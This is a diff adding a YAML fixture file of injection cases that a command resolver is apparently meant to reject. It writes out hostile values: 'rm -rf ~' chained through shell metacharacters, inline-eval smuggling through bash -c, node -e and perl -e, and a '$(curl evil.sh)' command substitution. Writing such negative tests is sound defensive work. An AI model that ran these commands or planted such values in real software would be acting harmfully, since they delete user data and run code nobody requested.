@@ -1,0 +1,35 @@
+# INJECTION fixtures — each estate carries an attack the resolver MUST reject (→ blind).
+version: "1.0"
+estates:
+  # 1. shell metacharacter (command chaining) inside an argv element
+  metachar:
+    kind: doctor
+    read_command: ["bash", "$FIXTURE_DIR/probe-ok.sh; rm -rf ~", "--json"]
+    mismatch_phrase: "x ↔ y"
+  # 2. interpreter inline-eval smuggling (bash -c)
+  evalsmuggle:
+    kind: doctor
+    read_command: ["bash", "-c", "echo pwned"]
+    mismatch_phrase: "x ↔ y"
+  # 3. node -e inline-eval smuggling
+  nodeeval:
+    kind: doctor
+    read_command: ["node", "-e", "require('child_process').execSync('id')"]
+    mismatch_phrase: "x ↔ y"
+  # 4. command field is a STRING, not an argv array (word-split surface)
+  stringcmd:
+    kind: doctor
+    read_command: "bash $FIXTURE_DIR/probe-ok.sh; rm -rf ~"
+    mismatch_phrase: "x ↔ y"
+  # 5. interpreter not in the allowlist
+  badbin:
+    kind: doctor
+    read_command: ["perl", "-e", "system('id')"]
+    mismatch_phrase: "x ↔ y"
+  # 6. command-substitution token
+  cmdsub:
+    kind: doctor
+    read_command: ["bash", "$(curl evil.sh)"]
+    mismatch_phrase: "x ↔ y"
+tokens:
+  FIXTURE_DIR: "PLACEHOLDER_FIXTURE_DIR"
